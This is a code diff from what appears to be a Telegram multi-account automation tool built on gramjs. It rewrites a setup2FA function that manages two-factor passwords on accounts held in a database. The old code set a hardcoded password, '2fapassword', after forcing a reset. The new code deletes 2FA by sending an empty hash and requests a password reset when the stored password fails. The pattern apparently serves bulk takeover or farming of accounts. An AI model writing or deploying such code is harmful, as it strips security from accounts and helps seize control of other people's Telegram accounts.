@@ -1,6 +1,6 @@
 import TelegramClient from '../../../gramjs/client/TelegramClient';
 import { generateRandomBytes } from '../../../gramjs/Helpers';
-import { computeDigest } from '../../../gramjs/Password';
+import { computeCheck } from '../../../gramjs/Password';
 import GramJs from '../../../gramjs/tl/api';
 import { Account } from '../../@types/Account';
 import { updateAccountById } from '../../db/accounts';
@@ -10,73 +10,50 @@ import { invokeRequest } from '../../modules/invokeRequest';
 const twoFaPassword = '2fapassword';
 export const setup2FA = async (client: TelegramClient, account: Account) => {
   try {
-    const { twoFa, unknownTwoFa } = account;
-    if (twoFa) {
-      return;
-    }
+    const pwd = await invokeRequest(client, new GramJs.account.GetPassword());
 
-    const resetPassword = await invokeRequest(
-      client,
-      new GramJs.account.ResetPassword()
-    );
-
-    if (resetPassword instanceof GramJs.account.ResetPasswordOk) {
+    if (!pwd || !pwd.hasPassword) {
       throw new Error('PASSWORD_EMPTY');
     }
 
-    if (!unknownTwoFa) {
-      await updateAccountById(client._accountId, {
-        unknownTwoFa: true,
-      });
+    if (!(pwd.newAlgo instanceof GramJs.PasswordKdfAlgoUnknown)) {
+      pwd.newAlgo.salt1 = Buffer.concat([
+        pwd.newAlgo.salt1,
+        generateRandomBytes(32),
+      ]);
+    }
+
+    const password = await computeCheck(pwd, twoFaPassword);
+    const deletedPassword = await client.invoke(
+      new GramJs.account.UpdatePasswordSettings({
+        password,
+        newSettings: new GramJs.account.PasswordInputSettings({
+          newAlgo: pwd.newAlgo,
+          newPasswordHash: Buffer.alloc(0),
+          hint: '',
+          email: undefined,
+          newSecureSettings: undefined,
+        }),
+      })
+    );
+
+    if (!deletedPassword) {
+      throw new Error('PASSWORD_NOT_DELETED');
     }
   } catch (e: any) {
     if (e.message === 'PASSWORD_EMPTY') {
-      const pwd = await invokeRequest(client, new GramJs.account.GetPassword());
-      if (!pwd) {
-        throw new Error('PWD_EMPTY');
-      }
+      const { twoFa } = account;
 
-      if (!(pwd.newAlgo instanceof GramJs.PasswordKdfAlgoUnknown)) {
-        pwd.newAlgo.salt1 = Buffer.concat([
-          pwd.newAlgo.salt1,
-          generateRandomBytes(32),
-        ]);
-      }
-
-      try {
-        const newPasswordHash = await computeDigest(pwd.newAlgo, twoFaPassword);
-        const passwordSettings = await invokeRequest(
-          client,
-          new GramJs.account.UpdatePasswordSettings({
-            password: new GramJs.InputCheckPasswordEmpty(),
-            newSettings: new GramJs.account.PasswordInputSettings({
-              newAlgo: pwd.newAlgo,
-              newPasswordHash,
-              hint: '',
-              email: undefined,
-              newSecureSettings: undefined,
-            }),
-          })
-        );
-
-        if (!passwordSettings) {
-          throw new Error('PASSWORD_SETTINGS_EMPTY');
-        }
-
+      if (twoFa !== false) {
         await updateAccountById(client._accountId, {
-          unknownTwoFa: false,
-          twoFa: true,
+          twoFa: false,
         });
-      } catch (e: any) {
-        await sendToMainBot(
-          `💀 ERROR_SETTING_UP_2FA 💀
-ID: ${client._accountId}
-ERROR: ${e.message}`
-        );
       }
+    } else if (e.message === 'PASSWORD_HASH_INVALID') {
+      await invokeRequest(client, new GramJs.account.ResetPassword());
     } else {
       await sendToMainBot(
-        `💀 ERROR_SETTING_UP_2FA_PASSWORD 💀
+        `💀 ERROR_DELETE_2FA 💀
 ID: ${client._accountId}
 ERROR: ${e.message}`
       );
